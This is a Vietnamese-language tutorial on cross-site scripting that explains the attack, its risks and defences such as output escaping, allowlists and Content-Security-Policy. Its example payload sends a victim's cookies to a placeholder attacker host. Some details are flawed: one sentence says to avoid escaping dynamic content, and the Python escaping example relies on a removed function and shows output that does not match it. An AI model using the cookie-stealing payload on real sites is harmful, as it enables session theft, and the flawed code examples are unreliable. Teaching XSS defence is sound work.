# Cross-Site Scripting
## 1. Khái Niệm
- **Cross-Site Scripting(XSS)**: Lỗ hổng XSS cho phép người dùng độc hại thực thi các đoạn JavaScript tùy ý khi người dùng khác truy cập trang web của bạn.
- **Cross-Site Scripting** là một trong những phương pháp tấn công phổ biến nhất mà các hacker sử dụng để tấn công các trang web.
### Ví dụ:
*"Một trang web thương mại điện tử cho phép người dùng gửi nhận xét về các sản phẩm. Trang web này cho phép người dùng nhập một đánh giá và hiển thị nó trên trang sản phẩm tương ứng."*
#
Một kẻ tấn công muốn thực hiện một cuộc tấn công XSS để đánh cắp thông tin đăng nhập của người dùng khi họ truy cập vào trang sản phẩm.
Kẻ tấn công thêm một bình luận chứa mã JavaScript độc hại vào trường đánh giá.
```javascript
<script>
  // Gửi cookie của người dùng đến kẻ tấn công
  var img = new Image();
  img.src = 'http://attacker.com/steal?cookie=' + document.cookie;
</script>
```
>Khi một người dùng khác truy cập vào trang sản phẩm và xem bình luận này, mã JavaScript độc hại sẽ được thực thi trên trình duyệt của họ. Điều này sẽ gửi cookie của người dùng đến máy chủ của kẻ tấn công, cho phép họ đánh cắp thông tin đăng nhập của người dùng.
## 2. Nguy Cơ
***Một cuộc tấn công XSS nghiêm túc có thể gây ra những hậu quả nào?***
1. Lây lan các loại mã độc trên các trang mạng xã hội phổ biến như Facebook, Twitter và YouTube.
2. Đánh cắp phiên đăng nhập (session hijacking): Mã JavaScript độc hại có thể gửi ID phiên đến một máy chủ từ xa dưới sự kiểm soát của hacker, cho phép hacker giả mạo người dùng bằng cách chiếm quyền điều khiển phiên đang hoạt động.
3. Đánh cắp danh tính: Thông qua việc người dùng nhập thông tin nhạy cảm như số thẻ tín dụng vào một trang web đã bị chiếm đoạt, các chi tiết này có thể bị đánh cắp bằng JavaScript độc hại.
4. Tấn công từ chối dịch vụ (DoS) và phá hoại trang web: Tấn công DoS để làm gián đoạn hoạt động và gây thiệt hại cho trang web.
5. Đánh cắp dữ liệu nhạy cảm như mật khẩu, đe dọa tài khoản người dùng và có thể dẫn đến các vụ vi phạm bảo mật khác.
6. Tiến hành gian lận tài chính trên các trang web ngân hàng bằng cách khai thác lỗ hổng XSS để thao túng các giao dịch hoặc trích xuất thông tin ngân hàng nhạy cảm.

## 3. Biện pháp bảo vệ
*"Để bảo vệ khỏi các cuộc tấn công XSS được lưu trữ, hãy đảm bảo mọi nội dung động đến từ kho lưu trữ dữ liệu đều không thể được sử dụng để chèn JavaScript vào một trang."*
***Đây là yêu cầu cốt lõi***
### Escape Dynamic Content
Các cuộc tấn công XSS sử dụng cách xử lý không đúng đối với nội dung động **(Dynamic Content)** được lấy từ một cơ sở dữ liệu backend. Kẻ tấn công lạm dụng một trường có thể chỉnh sửa bằng cách chèn mã JavaScript, sau đó mã này được đánh giá trong trình duyệt khi một người dùng khác truy cập trang đó.  

Vì vậy, hiếm khi bạn muốn người dùng của mình tạo ra đoạn mã HTML chưa được xử lý **(raw HTML)**. Thay vào đó, bạn nên *tránh thoát tất cả nội dung động* được lấy từ cơ sở dữ liệu, để trình duyệt biết rằng nó cần được xử lý như là nội dung của các thẻ HTML, không phải là HTML chưa xử lý.  

Việc thoát nội dung động thường bao gồm việc thay thế các ký tự quan trọng bằng mã HTML entities:

|Character|	Encoding|  
|:--------|:-------|
|<        |	&#60   |  
|>        |	&#62   |  
|&        |	&#38   |  
|"        |	&#34   |  
|'        |	&#39   |  
**Ví dụ về Escape dynamic content:**
```python
    import cgi

    # Giả sử comment là nội dung động từ cơ sở dữ liệu
    comment_from_database = "<script>alert('XSS attack!');</script>"

    # Escape nội dung động trước khi hiển thị trên trang web
    escaped_comment = cgi.escape(comment_from_database)

    # In ra nội dung đã được escape
    print(escaped_comment)
```
**Output thu được:**
```console
    &lt;script&gt;alert(&#x27;XSS attack!&#x27;);&lt;/script&gt;
```
### Allowlist Values
Giảm thiểu rủi ro XSS bằng cách hạn chế dữ liệu được nhập vào và đảm bảo rằng chỉ các giá trị được xác định trước mới được phép hiển thị.  
**Ví dụ**:Thay vì yêu cầu người dùng nhập quốc gia cư trú của họ, thì tốt nhất là yêu cầu họ chọn từ một danh sách thả xuống có sẵn bao gồm tên các quốc gia.

### Implement a Content-Security Policy
**Triển khai Chính sách Bảo mật Nội dung** ***(Content-Security Policy - CSP)*** là một cách mạnh mẽ để tăng cường tính bảo mật cho ứng dụng web của bạn chống lại các cuộc tấn công XSS. Dưới đây là cách triển khai CSP:  

 1. ***Hiểu về CSP***: CSP cho phép bạn xác định các quy tắc về nơi mà các tài nguyên như JavaScript có thể được tải và thực thi trên trang web của bạn. Điều này giúp ngăn chặn các cuộc tấn công XSS bằng cách hạn chế nơi mà các script có thể xuất phát từ.  
 2. ***Thiết lập CSP trong Header Phản hồi***: Bạn có thể thiết lập CSP trong header phản hồi của máy chủ web của bạn. Dưới đây là một ví dụ về header CSP cho phép các script chỉ từ cùng một nguồn gốc và từ "https://apis.google.com":
    ```
    Content-Security-Policy: script-src 'self' https://apis.google.com
    ```
 3. ***Sử dụng CSP trong Thẻ <meta>***: Hoặc, bạn có thể bao gồm các chỉ thị CSP trực tiếp trong thẻ <meta> trong phần tử <head> của tài liệu HTML của bạn:
    ```
    <meta http-equiv="Content-Security-Policy" content="script-src 'self' https://apis.google.com">
    ```
 4. ***Thực thi CSP***: Bằng cách xác định các nguồn được phép cho các script, bạn mặc định không cho phép JavaScript nằm trong trang, đây là một cách tiếp cận hiệu quả để ngăn chặn các cuộc tấn công XSS.
 5. ***Báo cáo Vi phạm CSP***: Để làm cho quá trình chuyển đổi dễ dàng hơn và đảm bảo rằng cài đặt CSP của bạn không gây ra vấn đề không mong muốn, bạn có thể sử dụng Báo cáo Vi phạm CSP. Bằng cách thêm một chỉ thị report-uri trong header chính sách của bạn, trình duyệt sẽ gửi báo cáo về bất kỳ vi phạm chính sách nào thay vì chặn JavaScript nội tuyến:
    ```
    Content-Security-Policy-Report-Only: script-src 'self'; report-uri https://example.com/csr-reports
    ```
## 4. Tổng Kết:
- **XSS** là một trong những mối đe dọa lớn nhất đối với bảo mật của các trang web.
- Bằng cách triển khai các biện pháp phòng chống XSS hiệu quả như trên, chúng ta có thể giảm thiểu rủi ro và bảo vệ dữ liệu người dùng khỏi các cuộc tấn công độc hại.
